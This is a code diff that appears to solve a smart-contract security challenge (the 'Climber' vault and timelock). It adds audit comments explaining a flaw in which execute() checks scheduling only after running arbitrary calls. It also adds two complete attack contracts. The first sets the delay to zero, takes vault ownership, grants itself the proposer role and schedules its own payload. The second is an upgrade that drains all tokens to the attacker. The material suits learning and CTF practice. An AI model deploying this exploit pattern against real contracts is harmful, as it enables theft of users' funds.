@@ -37,6 +37,8 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         __Ownable_init();
         __UUPSUpgradeable_init();
 
+        // @audit ClimberTimelock becomes owner of ClimberVault. If we can
+        // take control of ClimberTimelock, we can upgrade ClimberVault
         // Deploy timelock and transfer ownership to it
         transferOwnership(address(new ClimberTimelock(admin, proposer)));
 
@@ -80,6 +82,108 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
         _lastWithdrawalTimestamp = timestamp;
     }
 
+    // @audit the owner of ClimberVault is set to ClimberTimelock in initialize()
     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
-    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+    function _authorizeUpgrade(address) internal override onlyOwner {}
+}
+
+// @audit Anyone can call ClimberTimelock.execute() which can execute
+// multiple sequential arbitrary code segments the attacker controls and it only 
+// checks that the operation exists in ClimberTimelockBase.operations after execution.
+//
+// Can we use this to execute our payload in such a way that it will
+// also populate ClimberTimelockBase.operations to pass the check after
+// execution?
+//
+// ClimberTimelockBase.operations is populated by ClimberTimelock.schedule()
+// which can only be called by PROPOSER_ROLE. However ClimberTimelock itself
+// has ADMIN_ROLE which is set as the admin of the PROPOSER_ROLE in constructor.
+// Hence ClimberTimelock can add new addresses to PROPOSER_ROLE.
+//
+// Attack via call to ClimberTimelock.execute() and use that to:
+//
+// a) call ClimberTimelock.updateDelay() to set delay = 0
+// 
+// b) as ClimberTimelock is owner of ClimberVault, transfer ownership to
+// attacker address
+//
+// c) grant PROPOSER_ROLE to attack contract,
+//
+// d) use ClimberTimelock.execute() to callback into attack contract, then call
+// ClimberTimelock.schedule() to populate ClimberTimelockBase.operations
+// with our payload to pass the check at the end of ClimberTimelock.execute()
+// 
+// d) attacker can then upgrade ClimberVault to new version that re-implements 
+// sweepFunds() to allow the owner to drain all the tokens
+//
+
+contract ClimberVaultAttack {
+    address payable immutable climberTimeLock;
+
+    // parameters for ClimberTimelock.execute() & ClimberTimelock.schedule()
+    address[] targets      = new address[](4);
+    uint256[] values       = [0,0,0,0];
+    bytes[]   dataElements = new bytes[](4);
+    bytes32   salt         = bytes32("!.^.0.0.^.!");
+
+    constructor(address payable _climberTimeLock, address _climberVault) {
+        climberTimeLock = _climberTimeLock;
+
+        // address upon which function + parameter payloads will be called by ClimberTimelock.execute()
+        targets[0]      = climberTimeLock;
+        targets[1]      = _climberVault; 
+        targets[2]      = climberTimeLock;
+        targets[3]      = address(this);
+
+        // first payload call ClimberTimelock.delay()
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+        // second payload call ClimberVault.transferOwnership()
+        dataElements[1] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, msg.sender);
+        // third payload call to ClimberTimelock.grantRole()
+        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector,
+                                                 PROPOSER_ROLE, address(this));
+        // fourth payload call ClimberVaultAttack.corruptSchedule()
+        // I tried to have it directly call ClimberTimelock.schedule() but this was
+        // resulting in a different ClimberTimelockBase.getOperationId() as the last
+        // element of dataElements was visible inside ClimberTimelock.execute() but not
+        // within ClimberTimelock.schedule(). Calling instead to a function back in
+        // the attack contract and having that call ClimberTimelock.schedule() gets
+        // around this
+        dataElements[3] = abi.encodeWithSelector(ClimberVaultAttack.corruptSchedule.selector);
+    }
+
+    function corruptSchedule() external {
+        ClimberTimelock(climberTimeLock).schedule(targets, values, dataElements, salt);
+    }
+
+    function attack() external {
+        ClimberTimelock(climberTimeLock).execute(targets, values, dataElements, salt);
+    }
+}
+
+// once attacker has ownership of ClimberVault, they will upgrade it to
+// this version which modifies sweepFunds() to allow owner to drain tokens
+contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    // must preserve storage layout or upgrade will fail
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+
+    function initialize(address, address, address) external initializer {
+        // Initialize inheritance chain
+        __Ownable_init();
+        __UUPSUpgradeable_init();
+    }
+
+    // changed to allow only owner to drain funds
+    function sweepFunds(address token) external onlyOwner {
+        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
+    }
+
+    // prevent anyone but attacker from further upgrades
+    function _authorizeUpgrade(address) internal override onlyOwner {}
 }
